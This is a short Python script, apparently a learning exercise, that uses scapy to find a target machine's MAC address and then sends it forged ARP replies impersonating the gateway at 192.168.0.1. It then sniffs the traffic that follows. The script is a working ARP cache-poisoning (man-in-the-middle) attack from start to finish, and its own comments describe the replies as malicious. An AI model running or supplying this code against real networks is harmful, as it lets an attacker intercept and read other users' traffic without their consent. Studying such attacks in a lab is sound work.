from scapy.all import *

ether = Ether()

## Discovering MAC Address of Target Machine

broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
arp_layer = ARP(pdst = '192.168.0.49')
entire_packet = broadcast / arp_layer
answer = srp(entire_packet, timeout = 2, verbose = True)[0]

## Creating Malicous ARP Response to victims machine

for i in range(2):
    target_mac_addr = answer[0][1].hwsrc
    packet = ARP(op=2, hwdst = target_mac_addr, pdst='192.168.0.49', psrc='192.168.0.1')
    send(packet, verbose = False)

    pkt = sniff(count = 10, prn = lambda x: x[0].show())

